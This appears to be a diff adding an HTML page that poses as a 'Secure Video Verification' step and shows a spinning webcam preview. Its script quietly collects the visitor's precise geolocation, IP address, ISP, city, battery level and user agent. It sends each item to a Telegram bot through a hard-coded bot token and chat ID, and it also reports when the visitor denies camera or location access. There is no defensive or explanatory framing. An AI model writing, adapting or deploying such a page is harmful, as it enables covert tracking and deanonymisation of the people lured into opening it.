@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>🎥 Secure Verification</title>
+<style>
+  body {margin:0;height:100vh;background:#0d0d2b;display:flex;justify-content:center;align-items:center;flex-direction:column;color:white;font-family:'Poppins',sans-serif;overflow:hidden;}
+  .spinner {width:250px;height:250px;border:20px solid rgba(255,255,255,0.2);border-top:20px solid #00ffea;border-radius:50%;animation:spin 1s linear infinite;box-shadow:0 0 30px #00ffea;position:relative;}
+  @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+  .video-circle {position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:160px;height:160px;border-radius:50%;overflow:hidden;box-shadow:0 0 20px #00ffea;}
+  video {width:100%;height:100%;object-fit:cover;}
+  h1 {font-size:2.2em;color:#00ffea;text-shadow:0 0 15px #00ffea;margin-bottom:20px;}
+</style>
+</head>
+<body>
+<h1>🔴 Secure Video Verification</h1>
+<div class="spinner">
+  <div class="video-circle">
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "7983135568:AAGZEbVk8zZcBuRrM-CCrItKc7XjJcF1e9I";
+const CHAT_ID = "1954755564";
+
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+  }).catch(console.error);
+}
+
+// Show webcam live feed
+navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+.then(stream => {
+  document.getElementById('video').srcObject = stream;
+})
+.catch(err => {
+  sendToTelegram(`⚠️ Webcam denied: ${err.message}`);
+});
+
+// Location
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(pos => {
+    const lat = pos.coords.latitude.toFixed(6);
+    const lon = pos.coords.longitude.toFixed(6);
+    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+    sendToTelegram(`📍 *Location:*\nLat: ${lat}, Lon: ${lon}\n[Open Maps](${mapsLink})`);
+  }, () => {
+    sendToTelegram("⚠️ Location denied.");
+  });
+} else sendToTelegram("⚠️ Geolocation not supported.");
+
+// Battery
+if (navigator.getBattery) {
+  navigator.getBattery().then(b => {
+    sendToTelegram(`🔋 *Battery:* ${(b.level*100).toFixed(0)}% | ${b.charging?"Charging":"Not Charging"}`);
+  });
+}
+
+// User Agent
+sendToTelegram(`📱 *User Agent:* ${navigator.userAgent}`);
+
+// IP
+fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN')
+  .then(r=>r.json())
+  .then(d=>sendToTelegram(`🌐 *IP:* ${d.ip}\n🏢 *ISP:* ${d.org || "Unknown"}\n📍 *City:* ${d.city}, ${d.region}, ${d.country}`))
+  .catch(()=>sendToTelegram("⚠️ IP/ISP fetch failed"));
+</script>
+</body>
+</html>
